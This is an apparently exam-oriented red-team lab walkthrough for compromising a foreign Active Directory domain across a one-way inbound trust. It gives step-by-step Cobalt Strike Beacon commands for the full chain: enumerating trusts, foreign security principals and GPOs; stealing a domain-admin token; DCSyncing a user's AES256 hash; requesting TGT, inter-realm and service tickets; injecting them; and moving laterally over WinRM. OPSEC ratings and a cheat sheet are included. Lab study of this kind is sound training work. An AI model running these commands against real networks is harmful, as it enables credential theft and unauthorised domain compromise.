# Inbound Trusts Lab

> The objective for this lab is to gain access to a foreign domain across a one-way inbound trust.

===

## Trust Relationship — Understand This First

Before touching any commands, lock in the trust direction. Everything else flows from this.

```
┌─────────────────────────────────────┐        ┌─────────────────────────────────────┐
│          CONTOSO.COM                │        │           PARTNER.COM               │
│   (OUR domain — beacon runs here)   │        │  (foreign/trusting domain)          │
│                                     │        │                                     │
│  Domain SID:                        │        │  Domain SID:                        │
│  S-1-5-21-3926355307-               │        │  S-1-5-21-4244029708-               │
│       1661546229-813047887          │        │       1901239654-2578485347         │
│                                     │        │                                     │
│  trustDirection = 1 (INBOUND)  ◄────┼────────┼──  PARTNER trusts CONTOSO           │
│                                     │        │                                     │
│  "Inbound to us = we are trusted"   │        │  Resources: par-jmp-1.partner.com   │
│  "Our users can go there"           │        │  DC:        par-dc-1.partner.com    │
└─────────────────────────────────────┘        └─────────────────────────────────────┘
         TRUSTED domain                                   TRUSTING domain
   (accounts originate here)                        (resources are here)
```

**Trust Direction Rule for the exam:**
- `trustDirection=1 INBOUND` (queried from CONTOSO) → PARTNER trusts CONTOSO → CONTOSO users can authenticate to PARTNER resources
- `trustDirection=2 OUTBOUND` → CONTOSO trusts the other → the other's users can come here
- `trustDirection=3` → bidirectional

**`trustAttributes=8` (TRUST_ATTRIBUTE_FOREST_TRANSITIVE)** — this is a forest-level trust, not just a domain-level trust. SID filtering is applied at the forest boundary — you cannot inject arbitrary SIDs from CONTOSO into PARTNER's PAC (SID history abuse is blocked). The only SIDs that flow across are legitimate group memberships set up via Foreign Security Principals.

---

## Object Map — Who Is Who Across Both Domains

Study this table before running any commands. Every SID you will see in the lab maps to one of these rows.

| SID | Domain | Object Type | Name | Role in the attack |
|-----|--------|-------------|------|--------------------|
| S-1-5-21-**3926355307**-1661546229-813047887-**500** | CONTOSO | User | Administrator | DA we start with |
| S-1-5-21-**3926355307**-1661546229-813047887-**6102** | CONTOSO | Group | **Partner Jump Users** | Bridge group — members of this CONTOSO group get PARTNER local admin via FSP |
| S-1-5-21-**3926355307**-1661546229-813047887-**XXXX** | CONTOSO | User | **rsteel** | Member of "Partner Jump Users" — the account we impersonate |
| S-1-5-21-**4244029708**-1901239654-2578485347-**1104** | PARTNER | Group | **Contoso Users** | PARTNER group — has CONTOSO's "Partner Jump Users" SID as an FSP member |
| S-1-5-**32**-544 | BUILTIN | Group | Administrators | Well-known local admins SID — "Contoso Users" is added here via GPO |

**How the access chain works (read this once, re-read it again):**

```
rsteel (CONTOSO user)
  └─ member of: "Partner Jump Users" (CONTOSO group, SID -6102)
                    │
                    │  Foreign Security Principal in PARTNER
                    │  (PARTNER stores a proxy object with SID -6102)
                    ▼
             "Contoso Users" group (PARTNER group, SID -1104)
                    │
                    │  GPO: "Contoso Jump Users" → linked to entire PARTNER domain
                    ▼
             BUILTIN\Administrators (S-1-5-32-544)
             on ALL computers in PARTNER
                    │
                    ▼
             par-jmp-1.partner.com — rsteel is local admin here
```

**What is a Foreign Security Principal (FSP)?**
When a CONTOSO group is added to a PARTNER group, PARTNER cannot store the CONTOSO object directly — it doesn't own that SID. Instead, PARTNER creates an FSP object in `CN=ForeignSecurityPrincipals,DC=partner,DC=com`. The FSP is just a placeholder that stores the CONTOSO SID. When rsteel authenticates cross-domain, his Kerberos PAC carries the "Partner Jump Users" SID (-6102). PARTNER's KDC sees the FSP, resolves it to "Contoso Users" membership, and adds -1104 to the PAC before issuing the service ticket.

---

## Ticket Flow — What Gets Issued by Whom

```
Step 1: DCSync rsteel hash from CONTOSO DC
         ↓
Step 2: AS-REQ → CONTOSO KDC (lon-dc-1)
         → returns: TGT_rsteel  (encrypted with CONTOSO krbtgt key)
         ↓
Step 3: TGS-REQ for krbtgt/partner.com → CONTOSO KDC
         → CONTOSO KDC sees inbound trust to PARTNER, issues referral
         → returns: INTER-REALM TGT  (encrypted with inter-realm trust key)
                    ↳ contains rsteel's SIDs including "Partner Jump Users" (-6102)
         ↓
Step 4: TGS-REQ for cifs/par-jmp-1 → PARTNER KDC (par-dc-1)
         → PARTNER KDC decrypts inter-realm TGT with trust key
         → resolves FSP: -6102 → "Contoso Users" (-1104)
         → adds -1104 to rsteel's PAC
         → returns: SERVICE TICKET for cifs/par-jmp-1  (encrypted with par-jmp-1 key)
         ↓
Step 5: SMB to par-jmp-1 with service ticket
         → par-jmp-1 sees "Contoso Users" (-1104) in PAC
         → GPO says -1104 = local admin
         → ACCESS GRANTED
```

**Key insight:** You need THREE separate tickets: TGT (CONTOSO) → Inter-realm TGT (trust boundary) → Service ticket (PARTNER). Each is issued by a different authority and encrypted with a different key. The commands in the Exploitation section step through this exactly.

===

## Enumeration

### What we are looking for
We need to confirm: (1) a trust exists and its direction, (2) a CONTOSO object has been placed into a PARTNER group, (3) what CONTOSO object that is, (4) which user is a member of it.

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the medium-integrity Beacon and enumerate the trust.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
    ```

    > This queries CONTOSO's domain for trust objects. Every domain trust is stored as a `trustedDomain` object. We pull four attributes:
    > - `trustPartner` — the FQDN of the other domain (will show `partner.com`)
    > - `trustDirection` — direction integer from CONTOSO's perspective
    > - `trustAttributes` — flags about the trust type
    > - `flatname` — NetBIOS name of the partner domain (e.g. `PARTNER`)

⚠️ What do these results mean?
    >
    > - `trustDirection 1` = **TRUST_DIRECTION_INBOUND** — PARTNER trusts CONTOSO. CONTOSO users can authenticate to PARTNER resources. We are the trusted domain.
    > - `trustAttributes 8` = **TRUST_ATTRIBUTE_FOREST_TRANSITIVE** — forest-level trust. SID filtering is ON — SID history injection across this boundary will be blocked. Only legitimate FSP group memberships carry across.

3. Enumerate the Foreign Security Principals Container of the foreign domain.

    ```Beacon-nocolor
    ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
    ```

    > **What this does:** We query PARTNER's directory (note `--hostname partner.com` and `--dn DC=partner,DC=com` — we are querying the foreign domain, not our own). We search for `foreignSecurityPrincipal` objects, which are PARTNER's placeholder representations of CONTOSO objects.
    >
    > **Why we can query PARTNER's LDAP:** Because the trust is inbound — PARTNER trusts us — so our beacon's existing token is accepted by PARTNER's DC for read-level LDAP queries.
    >
    > The `objectSid` on each FSP is the **CONTOSO SID** of the object that was added to the PARTNER group. The `memberOf` shows which PARTNER group that FSP belongs to.

⚠️ This will show that the SID `S-1-5-21-3926355307-1661546229-813047887-6102` (a CONTOSO SID — note the CONTOSO domain prefix `3926355307-1661546229-813047887`) is a member of a "Contoso Users" group in PARTNER.

    > **At this point you know:** Something from CONTOSO with SID ending in `-6102` has been placed into PARTNER's "Contoso Users" group. You don't yet know what the `-6102` object is — could be a user or group. Next step resolves it.

4. Identify what that local SID is.

    ```Beacon-nocolor
    ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
    ```

    > **What this does:** Now we switch back to querying CONTOSO (no `--hostname` flag — defaults to our own domain). We look up what object in CONTOSO owns SID `-6102`.
    >
    > `samAccountType` tells us the object type:
    > - `805306368` = user account
    > - `268435456` = domain group (this is what we expect here)
    > - `805306369` = computer account

⚠️ Output shows it is a domain group called **"Partner Jump Users"** in CONTOSO. This is the bridge group — whoever is a member of this CONTOSO group will inherit "Contoso Users" group membership in PARTNER via the FSP, and therefore get local admin on all PARTNER machines via GPO.

5. Enumerate members of that group.

    ```Beacon-nocolor
    ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
    ```

    > **What this does:** Find every user (`samAccountType=805306368`) or group (`samAccountType=268435456`) that is a direct member of "Partner Jump Users" in CONTOSO. The `memberof` filter uses the full DN of the group.
    >
    > **Why this matters:** These accounts are the ones we can use to authenticate to PARTNER. We need an account in this group that we can obtain credentials for (via DCSync, as we have DA on CONTOSO).

⚠️ This returns `rsteel` — a CONTOSO user who is a member of "Partner Jump Users". rsteel is our target account for impersonation.

6. Find a domain controller in the foreign domain.

    ```Beacon-nocolor
    nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
    ```

    > **What this does:** DNS SRV record lookup against our own DC (`10.10.120.1`), asking for LDAP SRV records for PARTNER's domain. The response gives us the FQDN of PARTNER's DC — `par-dc-1.partner.com`. We need this hostname explicitly in later steps when directing Kerberos requests to PARTNER's KDC.

===

## Discovery

Enumerate the foreign domain to confirm exactly where "Contoso Users" (and therefore rsteel) has privileged access, and on which machines.

### What we are looking for
We know "Contoso Users" exists in PARTNER. We need to find HOW it has been granted local admin — the mechanism is likely a GPO. Then find which computers are in scope.

1. List GPOs.

    ```Beacon-nocolor
    ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
    ```

    > Queries PARTNER's DC for all Group Policy Objects. `gPCFileSysPath` gives the SYSVOL path where the GPO's template files live — we'll download one of these to read the actual policy content.

⚠️ This reveals a GPO called **"Contoso Jump Users"**. The `gPCFileSysPath` will give the GUID-based path: `\\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\`

2. Download the GPO's *GptTmpl.inf* file.

    ```Beacon-nocolor
    download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
    ```

    > `GptTmpl.inf` is the Security Template file inside a GPO. It defines things like local group membership via `[Group Membership]` section entries. We can read this to see exactly which SIDs are being added to which local groups — without needing to log onto a PARTNER machine.
    >
    > This download goes over SMB through the beacon's existing Kerberos context — our current token is accepted because PARTNER trusts CONTOSO.

3. Sync it to your Attacker desktop and open it in Notepad.

⚠️ The file shows:
    > ```
    > [Group Membership]
    > *S-1-5-21-4244029708-1901239654-2578485347-1104__Memberof = *S-1-5-32-544
    > ```
    > Reading this: the group with SID `S-1-5-21-4244029708-...-1104` (that is PARTNER's "Contoso Users" group) is configured as a member of `S-1-5-32-544` (BUILTIN\Administrators — the local admins group) on every machine this GPO applies to.
    >
    > **SID breakdown:**
    > - `S-1-5-21-4244029708-1901239654-2578485347` → PARTNER domain SID prefix
    > - `-1104` → RID of "Contoso Users" in PARTNER
    > - `S-1-5-32-544` → Well-known SID for local Administrators (always the same on every Windows machine)

4. Confirm that "Contoso Users" (PARTNER SID -1104) has the CONTOSO "Partner Jump Users" (-6102) as a member.

    ```Beacon-nocolor
    ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
    ```

    > Queries PARTNER for the group object that owns SID `-1104`. The `member` attribute will list the FSP DN for the CONTOSO "Partner Jump Users" object. This closes the loop: CONTOSO `-6102` (Partner Jump Users) → PARTNER `-1104` (Contoso Users) → local Admins via GPO.

5. Find where that GPO is linked.

    ```Beacon-nocolor
    ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
    ```

    > Searches for any OU or domain object in PARTNER that has this GPO GUID in its `gPLink` attribute. `gPLink` stores which GPOs are linked to a container.

⚠️ Returns the top-level domain object — the GPO is linked at the domain root, meaning it applies to **all computers in PARTNER.COM**, not just a subset. Every machine in PARTNER has "Contoso Users" as local admin.

6. Find what computers exist in the foreign domain.

    ```Beacon-nocolor
    ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName
    ```

    > `samAccountType=805306369` = computer accounts. Lists all machines in PARTNER so you know valid targets. `par-jmp-1.partner.com` will appear here — this is our jump target for the exploitation step.

===

## Exploitation

### What we need to do
We have DA on CONTOSO. rsteel (a CONTOSO user) has local admin on all PARTNER machines via group membership. We need to authenticate to a PARTNER machine **as rsteel** using Kerberos. We cannot use rsteel's plaintext password (we don't have it), but we have DA so we can DCSync the AES256 hash and use that to mint a TGT. Then we walk the Kerberos referral chain across the trust.

**Account we are targeting:** `rsteel` — a CONTOSO domain user, member of "Partner Jump Users"
**Target machine:** `par-jmp-1.partner.com` — a jump server in PARTNER where rsteel has local admin

> **Exam tip — read before running anything:**
> DCSync requires DA rights. `steal_token` MUST happen before `dcsync` or it will fail with `ERROR_DS_DRA_ACCESS_DENIED (0x20f7)`. Running DCSync as `NT AUTHORITY\SYSTEM` on a workstation does NOT work — SYSTEM is a local identity with no AD replication rights.
> `kerberos_ticket_use` MUST be called before any network command that needs the injected ticket. `krb_asktgt`/`krb_asktgs` obtain tickets but the beacon's SMB/WinRM stack will not use them until `kerberos_ticket_use` wires the `.kirbi` into the active Kerberos session.

---

1. **OPSEC-🟢SAFE** — Steal a DA token on the high-integrity Beacon.

    ```cs
    beacon> process_browser                    // find a process owned by dyork
    beacon> steal_token <dyork-pid>            // impersonate CONTOSO\dyork in-process, no spawn
    ```

    > Duplicates dyork's token into the beacon process. No child process, no Event 4688. This is the only way to DCSync — you need a token with `DS-Replication-Get-Changes-All` rights on the domain, which DA accounts have. `NT AUTHORITY\SYSTEM` on a workstation does not have this right.
    >
    > ⚠️ **Exam trap:** If you skip this step and run `dcsync` while the beacon token is SYSTEM, you get `ERROR_DS_DRA_ACCESS_DENIED (0x20f7)`. The DCSync silently fails and you have no hash to continue with.

2. **OPSEC-🟠CAUTION** — DCSync *rsteel*'s AES256 hash.

    ```cs
    beacon> dcsync contoso.com CONTOSO\rsteel
    ```

    > **Why rsteel, not Administrator?** rsteel is the bridge account — member of "Partner Jump Users" which maps via FSP to PARTNER local admin. DCSync with dyork's token generates Event 4662 on the DC. Use the `aes256_hmac` value only — AES256 is normal pre-auth behaviour and less anomalous than RC4.
    >
    > Event log: **4662** on `lon-dc-1` — Directory Service access, Properties: `DS-Replication-Get-Changes-All`

3. **OPSEC-🟠CAUTION** — Request a TGT for *rsteel* from CONTOSO's KDC.

    ```cs
    beacon> krb_asktgt /user:rsteel /aes256:<aes256_hmac-from-dcsync>
    ```

    > AS-REQ sent to CONTOSO's KDC using rsteel's AES256 hash as pre-auth. KDC returns a TGT for `rsteel@CONTOSO.COM` encrypted with CONTOSO's `krbtgt` key.
    >
    > **Ticket in hand:** `TGT_rsteel` — valid for CONTOSO only.
    >
    > **Save the base64 output** — you need it for step 4 AND to decode to `rsteel_tgt.kirbi` for step 7.
    >
    > Event log: **4768** (AS-REQ) on `lon-dc-1`

4. **OPSEC-🟠CAUTION** — Request an inter-realm referral ticket.

    ```cs
    beacon> krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
    ```

    > TGS-REQ to CONTOSO's KDC for service `krbtgt/partner.com`. Requesting the `krbtgt` of a foreign realm signals a cross-realm referral. CONTOSO's KDC sees the inbound trust with PARTNER and issues a cross-realm TGT encrypted with the **inter-realm trust key** — shared between both KDCs, derived from the trust password.
    >
    > **Ticket in hand:** `INTER-REALM TGT` — only PARTNER's KDC can decrypt this. Contains rsteel's SIDs including "Partner Jump Users" (-6102).
    >
    > **Save the base64 output** — used in steps 5 and 5b.
    >
    > Event log: **4769** (TGS-REQ for `krbtgt/partner.com`) on `lon-dc-1` — unusual, normal users don't request cross-realm referrals directly.

5. **OPSEC-🟠CAUTION** — Request a CIFS service ticket for *par-jmp-1* from PARTNER's KDC.

    ```cs
    beacon> krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
    ```

    > TGS-REQ sent to **PARTNER's KDC** (`/dc:par-dc-1.partner.com` — critical, must point at PARTNER, not CONTOSO). PARTNER's KDC:
    > 1. Decrypts inter-realm TGT with the trust key → validates it came from CONTOSO
    > 2. Reads rsteel's PAC → sees `-6102` (Partner Jump Users)
    > 3. Resolves FSP: `-6102` → member of "Contoso Users" (`-1104`)
    > 4. Adds `-1104` to rsteel's PAC in the new ticket
    > 5. Issues CIFS service ticket encrypted with par-jmp-1's machine account key
    >
    > **Ticket in hand:** `SERVICE TICKET` for `cifs/par-jmp-1.partner.com` — PAC contains `-1104` which GPO maps to local Administrators.
    >
    > **Save the base64 output** — decode to `rsteel_cifs.kirbi`.
    >
    > Event log: **4769** on `par-dc-1` — first event generated on PARTNER infrastructure.

5b. **OPSEC-🟠CAUTION** — Also request an HTTP service ticket for WinRM lateral movement.

    ```cs
    beacon> krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
    ```

    > `jump winrm64` authenticates over WinRM using the **`http` SPN**, not `cifs`. If you only inject the CIFS ticket and then run `jump winrm64`, you get error `0x8009030e` — "A specified logon session does not exist" — because Kerberos cannot find a ticket for `http/par-jmp-1.partner.com` in the session.
    >
    > **Same inter-realm ticket is reused** — no extra DCSync or TGT needed, just a second `krb_asktgs` call with `http` instead of `cifs`.
    >
    > **Save the base64 output** — decode to `rsteel_http.kirbi`.
    >
    > Event log: **4769** on `par-dc-1`

6. **OPSEC-🟢SAFE** — Decode the `.kirbi` files on the attacker desktop.

    ```powershell
    # Run on attacker Windows desktop (not in beacon) — CyberChef or PowerShell:
    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_cifs.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-5>"))

    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_http.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-5b>"))

    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_tgt.kirbi",
      [System.Convert]::FromBase64String("<base64-from-step-3>"))
    ```

    > Local file operation — no Kerberos events, no network traffic.

7. **OPSEC-🟢SAFE** — Inject the CIFS ticket and verify.

    ```cs
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
    beacon> run klist
    ```

    > `kerberos_ticket_use` wires the `.kirbi` into the beacon's active Kerberos logon session. Without this step, the beacon's SMB stack uses its existing token identity (SYSTEM or low-priv user) and ignores the Kerbeus-obtained ticket entirely.
    >
    > Verify `klist` output shows: `Server: cifs/par-jmp-1.partner.com @ PARTNER.COM`
    > The `@ PARTNER.COM` confirms the ticket was issued by PARTNER's KDC, not CONTOSO's.
    >
    > ⚠️ **Exam trap:** Skipping `kerberos_ticket_use` and going straight to `ls` will give `ERROR_ACCESS_DENIED (5)` even though `krb_asktgs` returned a valid ticket.

8. **OPSEC-🟢SAFE** — Access C$ on *par-jmp-1* via SMB.

    ```cs
    beacon> ls \\par-jmp-1.partner.com\c$
    ```

    > Service ticket is presented to par-jmp-1 over SMB. par-jmp-1 decrypts with its machine account key, reads the PAC, sees "Contoso Users" (-1104), maps to local Administrators via GPO — access granted.
    >
    > Event log: **4624 Type 3** (network logon) on `par-jmp-1` — normal admin SMB, no lateral movement artefact.

9. **OPSEC-🟢SAFE** — Lateral move to *par-jmp-1* via WinRM.

    ```cs
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi
    beacon> run klist                           // verify: http/par-jmp-1.partner.com @ PARTNER.COM
    beacon> jump winrm64 par-jmp-1.partner.com smb
    ```

    > Inject the HTTP ticket, then `jump winrm64`. WinRM authentication uses the `http` SPN — this ticket gives Kerberos auth across the trust boundary. CS injects a beacon into `wsmprovhost.exe` on par-jmp-1 and connects back over the SMB listener named pipe.
    >
    > ⚠️ **Exam trap:** If you only injected the CIFS ticket and run `jump winrm64`, you get `0x8009030e` — logon session error. You need BOTH tickets: `cifs` for `ls`/`download`, `http` for `jump winrm64`.
    >
    > Event log: **4624 Type 3** on `par-jmp-1` — WinRM network logon from rsteel. No service created, no Event 7045.

10. **Cleanup** — OPSEC-🟢SAFE.

    ```cs
    beacon> kerberos_ticket_purge               // remove all injected tickets from session
    beacon> rev2self                            // drop dyork impersonation token
    ```

⚠️ In this lab, you have taken advantage of legit access assigned across a one-way inbound trust. The entire chain — DCSync → 3-ticket Kerberos referral → SMB access → WinRM lateral move — generates events only in CONTOSO (4662, 4768, 4769) and one network logon event on par-jmp-1. No process creation, no service installation, no disk writes on the target.

===

## Quick Reference — Exam Day Cheat Sheet

### Trust Direction Decision Tree
```
Query your domain → find trustedDomain objects

trustDirection=1 (INBOUND)  → YOU are trusted → YOUR users access THEIR resources
trustDirection=2 (OUTBOUND) → THEY are trusted → THEIR users access YOUR resources
trustDirection=3 (BOTH)     → bidirectional
trustAttributes=8           → forest trust → SID filtering ON → no SID history abuse
trustAttributes=32          → TREAT_AS_EXTERNAL → SID filtering partially relaxed
```

### Ticket Chain for Cross-Trust Access
```
0. steal_token <DA-pid>                                                      OPSEC-🟢SAFE   PREREQUISITE
1. dcsync <domain> <DOMAIN\user>                                             OPSEC-🟠CAUTION Event 4662 on source DC
2. krb_asktgt /user:<user> /aes256:<hash>         → TGT                     OPSEC-🟠CAUTION Event 4768 on source DC
3. krb_asktgs /service:krbtgt/foreign.domain      → INTER-REALM TGT         OPSEC-🟠CAUTION Event 4769 on source DC
4. krb_asktgs /service:cifs/target /dc:foreign-dc → CIFS SERVICE TICKET     OPSEC-🟠CAUTION Event 4769 on foreign DC
4b.krb_asktgs /service:http/target /dc:foreign-dc → HTTP SERVICE TICKET     OPSEC-🟠CAUTION Event 4769 on foreign DC
5. [decode base64 → .kirbi on attacker desktop]                              OPSEC-🟢SAFE   local only
6. kerberos_ticket_use <cifs.kirbi>               → inject CIFS ticket       OPSEC-🟢SAFE   REQUIRED before ls
7. ls \\target\c$                                 → SMB access confirmed     OPSEC-🟢SAFE   Event 4624 T3 on target
8. kerberos_ticket_use <http.kirbi>               → inject HTTP ticket       OPSEC-🟢SAFE   REQUIRED before winrm
9. jump winrm64 target smb                        → beacon in wsmprovhost    OPSEC-🟢SAFE   Event 4624 T3 on target
10.kerberos_ticket_purge + rev2self               → cleanup                  OPSEC-🟢SAFE
```

### Common Failures and Fixes
```
ERROR_DS_DRA_ACCESS_DENIED (0x20f7) on dcsync
  → You skipped steal_token. SYSTEM on a workstation ≠ DA rights.
  → Fix: process_browser → steal_token <DA-pid> → retry dcsync

ERROR_ACCESS_DENIED (5) on ls after krb_asktgs
  → You skipped kerberos_ticket_use. The ticket was obtained but not wired in.
  → Fix: decode base64 → .kirbi → kerberos_ticket_use <cifs.kirbi> → retry ls

0x8009030e logon session error on jump winrm64
  → You only injected the CIFS ticket. WinRM uses http SPN, not cifs.
  → Fix: krb_asktgs http/target + kerberos_ticket_use <http.kirbi> → retry jump winrm64
  → Also check: klist should show http/target @ FOREIGN.DOMAIN before jump
```

### SID Identification by Domain Prefix
```
S-1-5-21-3926355307-1661546229-813047887-XXXX  → CONTOSO object
S-1-5-21-4244029708-1901239654-2578485347-XXXX → PARTNER object
S-1-5-32-544                                    → BUILTIN\Administrators (local, any machine)
```

### What to Look For During Enumeration
```
FSP (foreignSecurityPrincipal) in foreign domain  → a CONTOSO object has access in PARTNER
objectSid on FSP has YOUR domain prefix            → resolve it in YOUR domain
GptTmpl.inf [Group Membership] section            → shows which SID → which local group
gPLink on domain/OU object                        → shows GPO scope (domain-wide = all machines)
samAccountType=805306369                           → computer accounts (valid targets)
```
